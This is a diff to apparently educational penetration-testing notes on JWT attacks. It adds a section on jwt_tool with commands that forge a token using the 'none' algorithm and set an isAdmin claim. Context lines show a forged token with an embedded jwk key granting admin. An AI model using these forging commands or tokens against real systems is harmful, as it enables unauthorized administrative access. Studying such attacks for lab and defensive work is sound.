@@ -6,7 +6,7 @@
     - [Algorithm Confusion](#algorithm-confusion)
     - [Reusing JWT Secrets](#reusing-jwt-secrets)
     - [Exploiting jwk](#exploiting-jwk)
-    - [Exploiting jku](#exploiting-jku)
+    - [Tools of the Trade](#tools-of-the-trade)
 
 
 
@@ -198,4 +198,18 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjo
         eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6InJ0eV96YWRVSjJBZFpfQ3BqaDJCRlVQd2YtWnlWeUt6aWYzbjZZc3ZxVWlwZjh5ZVNpSGk2RFJVRm9ibzVfMnpnSnRQeVVGTmNyRzIwSWd6cTdobzRDNWRfcVN0d2RfVnRfcHQ0Q0Zmdm1CZHRlZzVTcmJIYVVlbU1CQXFYbVB6S2sxOUNOVkZTdVhqa21mSk9OZ1Q3Q3VoRFV5bTFiN3U3TjNsQmlZVmh2Rnl5NVZ1dHplNkN2MS1aMTF0THhCaEF4cnlNTHNsSG1HODZmNld5ZTAwcGYyR21xel93LTdGT3dfcUFZdUwtZlpMVXNZSVltT01PVDAxa3pMV1VWSDJ0R2VYNGdYaVc2YU94cC1SNFd4NUo5ai1QZlFjcVFTOXduOHZ0Ry1rSjBQYlRVbGozUi12djk3d0VLcEZuanhzSGxWN1Rvcm9nSWJKTDZ4YUZJR3YxUSJ9LCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6dHJ1ZX0.FimEK1Cnw1PL8Krt7mpzIcBAkVgTOAVquh7yUFIr3xrQmaDzObxmlkOZmHwmBN1Odc0NOZToWVo_o-0Yf1ldPvueGlCShlUyoOyFMVQhiWcW_EIpCPdRoG60Venyp6ePHirrZGPSXz4JAKUKRdj4CWK_2sIHlQmGmmMy0W1hL-08Dq-oueYWY-OsshDrbyMx6ibZ8vmVL4PkiBv6PalPDIrIrJZHEM0tr0IotZy_MNiOF2Rvy22XU2FapIj0cuCL21vud9k_IQZwVhPdEJ_XEnnLiFYRYI0wBl3SQ9N4xtt0eMPSe4CqtOd4veYT1JCmqL6jKkkumIqdUHcdQhA_Aw
         ```
 
+## Tools of the Trade
+- [jwt_tool](https://github.com/ticarpi/jwt_tool) 
+```bash
+git clone https://github.com/ticarpi/jwt_tool
+pip3 install -r requirements.txt
 
+## JWT Analysis
+python3 jwt_tool/jwt_tool.py <TOKEN>
+
+## Forging JWTs
+python3 jwt_tool/jwt_tool.py -X a -pc isAdmin -pv true -I <TOKEN>
+
+# using none algorithm by specifying the -X a flag
+# set the 'isAdmin' claim to true by specifying the following flags: -pc isAdmin -pv true -I.
+```
